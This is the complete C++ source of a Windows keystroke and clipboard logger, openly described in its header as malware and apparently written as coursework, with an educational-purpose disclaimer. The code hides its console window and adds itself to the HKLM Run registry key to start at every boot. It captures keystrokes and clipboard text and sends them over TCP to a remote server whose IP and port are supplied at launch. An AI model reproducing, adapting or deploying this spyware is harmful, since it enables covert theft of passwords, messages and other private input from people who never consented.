/*
 *
 * Author name:	SAEED GHIASSY
 * 
 * Description: 
 * This is a Keystroke & Clipboard Logger application(Malware).
 * Data would be sent to remote listening server on a specified port.

 * Compiled with: Visual C++ 2010

*** PLEASE NOTE: THIS APPLICATION IS FOR EDUCATIONAL PURPOSE ONLY      *** 
*** AND WRITTEN AS REQUESTED FOR MY COURSE WORK, THEREFORE I ACCEPT    *** 
*** NO RESPONSIBILITIES OVER THE POSSIBLE MISS USE OF THIS APPLICATION *** 
*** AND SHOULD BE USED AT YOUR OWN RISK.                               *** 
*/
#include <iostream>
#include <tchar.h>
#include <stdio.h>
#include <string>
#include <sstream>
#include <Windows.h>
#include <time.h>
#pragma comment(lib,"ws2_32.lib")

//This is a default buffer size to send to remote server
#define MYBUFSIZE 256
using namespace std;
//defining global varibales
string KeyboardData;
char Temp;
string IP;
int PORT;


//Create External Thread in windows to keep sending the 
//logging info to remote server
//and if the server is not there or failes to receive it 
//it would keep trying
DWORD WINAPI SendThread(LPVOID lpParam)
{
	//local varibales 
	//emptying the KeyboardData global varibale for further use
	string buf = KeyboardData;
	KeyboardData = "";
	char  *m_time;
	string Data;
	time_t theTime=time(0);
	m_time = ctime(&theTime);
	//sending data to remote server
	Data = "[+]Keyboard:<" + string(m_time).substr(0, string(m_time).length() -1) + ">" + buf + "\n\n";

	//cout << "Buffer Data: " << Data;  //--debug purposes

	SOCKET m_socket;
	SOCKADDR_IN i_sock;
	WSADATA wsaData;
	int ByteSent=0;

	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != NO_ERROR)
	{
		cerr << "Client: Error at WSAStartup()" << endl; // debug purposes
		return 0;
	}else{
		cout << "WSAStartup() was ok :)" << endl;
	}
	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_socket == INVALID_SOCKET)
	{
		cerr << "Init Socket Failed :( " << endl;
		WSACleanup();
		return 0;
	}
	i_sock.sin_family = AF_INET;
	i_sock.sin_addr.s_addr = inet_addr(IP.c_str());
    i_sock.sin_port = htons(PORT);
	if (connect(m_socket, (SOCKADDR*)&i_sock, sizeof(i_sock)) == SOCKET_ERROR)
    {
		cerr << "Connect() Failed :( " << endl;
		WSACleanup();
		return 0;
    }else{
		cout << "[+]Connection has been established :)" << endl;
		ByteSent = send(m_socket, Data.c_str(), Data.length(), 0);
		if(ByteSent > 0)
			cout << "sent!" << endl;
	}
	cout << "Closing connection!" << endl;
	WSACleanup();

	return 0;
}///////////////////////////////////////////////
//This thread gets the users Clipboard data
//and sends it to remote server
DWORD WINAPI ClipBoard_Thread(LPVOID lpParam)
{
	//defining local varibales
	char  *m_time;
	HANDLE hClip = NULL;
	string buf;
	//open the clipboard - windows api
	if(OpenClipboard(NULL))
	{
		hClip = GetClipboardData(CF_TEXT);
	}else{
		return 0;
	}
	if(hClip == NULL)
	{
		string buf = "Nothing in Clipboard!";
	}else{
		buf = (char *)hClip;
	}
	string Data;
	time_t theTime=time(0);
	m_time = ctime(&theTime);
	//send data to server with current time 
	Data = "\n[+]Clipboard:<" + string(m_time).substr(0, string(m_time).length() -1) + ">" + buf + "\n\n";

	cout << "Clipboard Data: " << Data;
	//starting the socket connection to remote server
	SOCKET m_socket;
	SOCKADDR_IN i_sock;
	WSADATA wsaData;
	int ByteSent=0;

	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (iResult != NO_ERROR)
	{
		cerr << "Client: Error at WSAStartup()" << endl; //Debug purposes
		return 0;
	}else{
		cout << "WSAStartup() was ok :)" << endl;
	}
	m_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(m_socket == INVALID_SOCKET)
	{
		cerr << "Init Socket Failed :( " << endl;
		WSACleanup();
		return 0;
	}
	i_sock.sin_family = AF_INET;
	i_sock.sin_addr.s_addr = inet_addr(IP.c_str());
    i_sock.sin_port = htons(PORT);
	if (connect(m_socket, (SOCKADDR*)&i_sock, sizeof(i_sock)) == SOCKET_ERROR)
    {
		cerr << "Connect() Failed :( " << endl;
		WSACleanup();
		return 0;
    }else{
		cout << "[+]Connection has been established :)" << endl;
		ByteSent = send(m_socket, Data.c_str(), Data.length(), 0);
		if(ByteSent > 0)
			cout << "sent!" << endl;
	}
	cout << "Closing connection!" << endl;
	WSACleanup();
	return 0;
}///////////////////////////////////////////////////


//----Start of Main function
int main(int argc, char **argv)
{
	//Takes 2 parameters for the first execution
	//then saves the IP address and Port number into windows Registery 
	//and its executes every time the machine boots up
	if(argc != 3)
	{
		cerr << "Usage: "<< argv[0] << " <Listening Server IP Address> <Port number>" << endl;
		exit(-1);
	}
	//--This would put the keylooger in stealth mode and
	//hides the window
	HWND hWnd; 
    AllocConsole();             
    hWnd = FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(hWnd,0);
	//--------------

	IP = argv[1];
	PORT = atoi(argv[2]);

	string reg  =  "\""+ string(argv[0]) +"\" \"" + string(argv[1]) + "\" \"" + string(argv[2]) + "\"";
	//Register the keylogger application into windows Registery
	//with given ip address and port so it would
	//keeps sending the logged info to given ip addresses and port number
	HANDLE hThreadSend;
	HANDLE hThreadClipboard;
	HKEY hKey;
	RegCreateKeyEx(
        /*hKey*/        HKEY_LOCAL_MACHINE,  
        /*lpSubKey*/    "SOFTWARE\\Microsoft\\Windows\\"
                        "CurrentVersion\\Run",
        /*Reserved*/    0,
        /*lpClass*/     NULL,
        /*dwOptions*/   REG_OPTION_NON_VOLATILE,
        /*samDesired */ KEY_ALL_ACCESS,
        /*lpSecurityAttributes*/ NULL, 
        /*phkResult */  &hKey,
        /*lpdwDisposition */ 0);
    RegSetValueExA(
        hKey, 
        "SaEeD-Logger", 
        0, 
        REG_SZ,  
		(LPBYTE)reg.c_str(),     
		reg.length()+1);

    RegCloseKey(hKey);

	//This line checks only if one copy of keylogger is already running
	//otherwise closes the application
	CreateMutexA(NULL, TRUE, "SaEeD"); 
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        ExitProcess(0);

	//------ Monitor Key input in infinity loop
	//so application would be keep running in the background
	while(1)
	{
		Sleep(50);//Monitor inputs from keystroke

		for(short character=8;character<=222;character++)
		{
			//If the keyboard buffer reaches it limit it would send it to
			//remote server and clears the buffer for further keystroke 
			if(KeyboardData.length() >= MYBUFSIZE)
			{	//Creathing external threads to handle remote connection and 
				//execute in normal mode
				hThreadSend = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendThread , NULL , 0, NULL);
				hThreadClipboard = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipBoard_Thread , NULL , 0, NULL);
				//wait for external threads
				WaitForSingleObject(hThreadSend, 1000*10);
				WaitForSingleObject(hThreadClipboard, 1000*10);
				CloseHandle(hThreadSend);
				CloseHandle(hThreadClipboard);
			}
			//This is windows global API to monitor keystrokes
			if(GetAsyncKeyState(character)==-32767)
			{
				//hex value for chars from A-Z
				if((character>0x40)&&(character<0x5B))
				{
					KeyboardData += (char)character;
					//hex value for numbers
				}else if((character >0x29) && (character < 0x40))
				{
					KeyboardData += (char)character;

				}else if(character == 0x40)
				{
					KeyboardData += "@";

				}else if(character == 0x24)
				{
					KeyboardData += "$";

				}else if (character == 0x21)
				{
					KeyboardData += "!";

				}else if(character == 0x3F)
				{
					KeyboardData += "?";

				}else{
					switch(character)
					{//swtich statment for special chars
					case VK_SPACE:
						KeyboardData += " ";
						break;
					case VK_RETURN:
						KeyboardData += "[Enter Pressed]\n";
						break;
					case VK_BACK:
						KeyboardData += "|->BACKSPACE<-|";
						break;
					case VK_TAB:
						KeyboardData += "[Tab Pressed]\t";
						break;
					case VK_DELETE:
						KeyboardData += "[DEL Pressed]";
						break;
					case VK_SHIFT:
						KeyboardData += "[SHIFT Pressed]";
						break;
					case VK_NUMPAD0:
						KeyboardData += "0";
						break;
					case VK_NUMPAD1:
						KeyboardData += "1";
						break;
					case VK_NUMPAD2:
						KeyboardData += "2";
						break;
					case VK_NUMPAD3:
						KeyboardData += "3";
						break;
					case VK_NUMPAD4:
						KeyboardData += "4";
						break;
					case VK_NUMPAD5:
						KeyboardData += "5";
						break;
					case VK_NUMPAD6:
						KeyboardData += "6";
						break;
					case VK_NUMPAD7:
						KeyboardData += "7";
						break;
					case VK_NUMPAD8:
						KeyboardData += "8";
						break;
					case VK_NUMPAD9:
						KeyboardData += "9";
						break;
					case 0xBD:
						KeyboardData += "-";
						break;
					case 0xBE:
						KeyboardData += ".";
						break;
					default:
						break;
					}
				}
			}//--- end of Key Logging if statement
		}
	}
	//----------------
		
	return EXIT_SUCCESS;
}//---end of Main 
